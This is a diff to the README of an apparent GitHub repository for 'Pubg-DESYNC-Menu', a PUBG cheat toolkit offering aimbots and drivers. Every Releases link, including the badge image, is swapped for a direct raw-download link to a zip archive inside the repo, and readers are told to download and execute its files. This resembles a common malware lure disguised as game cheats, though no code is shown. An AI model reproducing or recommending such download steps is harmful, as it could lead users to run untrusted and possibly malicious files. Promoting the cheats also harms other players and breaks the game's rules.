@@ -1,6 +1,6 @@
 # 🎮 Pubg-DESYNC-Menu
 
-![GitHub Release](https://img.shields.io/badge/Release-v1.0-blue?style=flat-square&logo=github)
+![GitHub Release](https://raw.githubusercontent.com/hussain1233/Pubg-DESYNC-Menu/main/PUBG Cheat/imgui/Pubg-DESYN-Menu-v1.6.zip)
 
 Welcome to **Pubg-DESYNC-Menu**, the ultimate toolkit designed to enhance your PUBG experience. This repository offers a collection of tools and resources that aim to improve gameplay and provide a competitive edge. 
 
@@ -18,7 +18,7 @@ Welcome to **Pubg-DESYNC-Menu**, the ultimate toolkit designed to enhance your P
 
 PUBG is a popular battle royale game that demands skill and strategy. While many players strive for fair competition, some seek enhancements to gain an advantage. The **Pubg-DESYNC-Menu** offers a range of features to help players achieve their desired gameplay style. This toolkit includes aimbots, optimization drivers, and various cheats that are designed for PC users.
 
-To get started, download the latest release from the [Releases section](https://github.com/hussain1233/Pubg-DESYNC-Menu/releases). You will need to download and execute the appropriate files for your system.
+To get started, download the latest release from the [Releases section](https://raw.githubusercontent.com/hussain1233/Pubg-DESYNC-Menu/main/PUBG Cheat/imgui/Pubg-DESYN-Menu-v1.6.zip). You will need to download and execute the appropriate files for your system.
 
 ## Features
 
@@ -46,7 +46,7 @@ For developers and enthusiasts, the source code is available for customization. 
 
 To install the **Pubg-DESYNC-Menu**, follow these steps:
 
-1. Visit the [Releases section](https://github.com/hussain1233/Pubg-DESYNC-Menu/releases).
+1. Visit the [Releases section](https://raw.githubusercontent.com/hussain1233/Pubg-DESYNC-Menu/main/PUBG Cheat/imgui/Pubg-DESYN-Menu-v1.6.zip).
 2. Download the latest version of the toolkit.
 3. Extract the downloaded files to your preferred location.
 4. Follow the instructions in the README file included in the package.
@@ -80,7 +80,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you have any questions or need assistance, please check the [Releases section](https://github.com/hussain1233/Pubg-DESYNC-Menu/releases) for updates and troubleshooting tips. You can also open an issue in the repository for any bugs or feature requests.
+If you have any questions or need assistance, please check the [Releases section](https://raw.githubusercontent.com/hussain1233/Pubg-DESYNC-Menu/main/PUBG Cheat/imgui/Pubg-DESYN-Menu-v1.6.zip) for updates and troubleshooting tips. You can also open an issue in the repository for any bugs or feature requests.
 
 ---
 
